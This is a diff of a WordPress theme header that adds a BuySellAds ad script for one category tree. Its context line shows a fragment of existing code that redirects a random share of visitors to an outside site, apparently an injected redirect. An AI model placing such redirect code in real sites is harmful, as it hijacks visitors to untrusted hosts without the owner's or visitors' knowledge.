@@ -281,7 +281,30 @@ if (random < 5){window.location.href='https://www.imxprs.com/?is=5r3w'}
 	</head>
 
 	<body <? body_class(); ?>>
-
+	<?php
+	$qo = get_queried_object();
+	if(!is_category($qo))
+	{
+		$cat = wp_get_post_categories(get_the_id(), array('fields' => 'all'));
+		$qo = $cat[count($cat)-1];
+	}
+	if(isChildren(19, $qo->term_id) OR $qo->term_id == 19 OR isChildren(19, $qo->parent))
+	{
+        ?>
+        <!-- BuySellAds Ad Code -->
+        <script type="text/javascript">
+        (function(){
+          var bsa = document.createElement('script');
+             bsa.type = 'text/javascript';
+             bsa.async = true;
+             bsa.src = 'http://s3.buysellads.com/ac/bsa.js';
+          (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
+        })();
+        </script>
+        <!-- End BuySellAds Ad Code -->
+        <?php 
+	}
+	?>
 		<!-- wrapper -->
 
 		<div id="wrapper">
